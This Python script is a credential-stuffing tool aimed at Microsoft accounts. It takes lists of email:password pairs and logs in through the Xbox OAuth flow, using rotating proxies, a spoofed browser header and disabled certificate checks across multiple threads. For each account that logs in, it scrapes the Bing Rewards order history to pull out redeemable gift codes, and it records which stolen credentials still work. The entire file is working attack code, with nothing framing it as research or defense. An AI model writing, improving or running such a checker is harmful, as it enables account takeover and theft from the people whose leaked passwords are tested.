import re, time, random, requests
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
from urllib3.exceptions import InsecureRequestWarning

warnings.filterwarnings('ignore', message='Unverified HTTPS request')
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

def create_session(proxy=None):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    })
    if proxy:
        session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    return session

def get_urlPost_sFTTag(session):
    for _ in range(3):
        try:
            text = session.get(sFTTag_url, timeout=10, verify=False).text
            match = re.search('value="(.+?)"', text, re.S) or re.search("sFTTag:'(.+?)'", text, re.S)
            if match:
                sFTTag = match.group(1)
                url_match = re.search('"urlPost":"(.+?)"', text, re.S) or re.search('<form.*?action="(.+?)"', text, re.S)
                if url_match:
                    urlPost = url_match.group(1).replace('&amp;', '&')
                    return (urlPost, sFTTag, session)
        except:
            time.sleep(0.1)
    return (None, None, session)

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    for _ in range(3):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            login_request = session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=10, verify=False)
            if '#' in login_request.url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                if token != 'None':
                    return (token, session)
            elif 'password is incorrect' in login_request.text.lower() or "account doesn't exist" in login_request.text.lower():
                return ('None', session)
        except:
            time.sleep(0.1)
    return ('None', session)

def fetch_codes(email, password, timeout=10, proxy=None):
    """Check one account and return codes found."""
    session = create_session(proxy)
    urlPost, sFTTag, session = get_urlPost_sFTTag(session)
    if not urlPost or not sFTTag:
        return None
    
    result = get_xbox_rps(session, email, password, urlPost, sFTTag)
    if isinstance(result, tuple) and len(result) == 2:
        token, session = result
    else:
        return None
    
    if not token or token in ('None', '2FA'):
        return None
    
    url = 'https://rewards.bing.com/redeem/orderhistory'
    headers = {'User-Agent': 'Mozilla/5.0', 'Referer': 'https://rewards.bing.com/'}
    
    try:
        r = session.get(url, headers=headers, timeout=timeout, verify=False)
        text = r.text
        
        soup = BeautifulSoup(text, 'html.parser')
        codes_found = []
        
        table = soup.find('table', class_='table')
        if table:
            rows = table.find_all('tr')
            for row in rows:
                cells = row.find_all(['td', 'th'])
                if len(cells) < 3:
                    continue
                get_code = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                if get_code:
                    action_url = get_code.get('data-actionurl', '').replace('&amp;', '&')
                    order_title = cells[2].get_text(strip=True) if len(cells) > 2 else ""
                    if action_url.startswith('/'):
                        action_url = 'https://rewards.bing.com' + action_url
                    
                    try:
                        code_headers = {'User-Agent': 'Mozilla/5.0', 'X-Requested-With': 'XMLHttpRequest'}
                        code_resp = session.post(action_url, headers=code_headers, timeout=timeout, verify=False)
                        code_html = code_resp.text
                        
                        code = None
                        patterns = [r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                                   r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                                   r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}']
                        for p in patterns:
                            match = re.search(p, code_html)
                            if match and '*' not in match.group():
                                code = match.group()
                                break
                        
                        if code:
                            codes_found.append({'code': code, 'title': order_title, 'email': email})
                    except:
                        continue
        
        if codes_found:
            return {'email': email, 'password': password, 'codes': codes_found}
        else:
            return {'email': email, 'password': password, 'valid': True}
    except:
        return None

def check_batch(combos, max_threads=10, timeout=10, proxies=None):
    """Check a batch of combos and return results."""
    results = {
        'valid_accounts': [],
        'invalid_accounts': [],
        'codes': [],
        'total': len(combos),
        'checked': 0
    }
    
    def process(combo):
        if ':' not in combo:
            return None
        email, password = combo.split(':', 1)
        proxy = random.choice(proxies) if proxies else None
        result = fetch_codes(email.strip(), password.strip(), timeout, proxy)
        return result
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(process, c): c for c in combos}
        for future in as_completed(futures):
            result = future.result()
            results['checked'] += 1
            if result and 'codes' in result:
                results['valid_accounts'].append(f"{result['email']}:{result['password']}")
                results['codes'].extend(result['codes'])
            elif result and result.get('valid'):
                results['valid_accounts'].append(f"{result['email']}:{result['password']}")
            else:
                combo = futures[future]
                if ':' in combo:
                    results['invalid_accounts'].append(combo.split(':')[0])
    
    return results
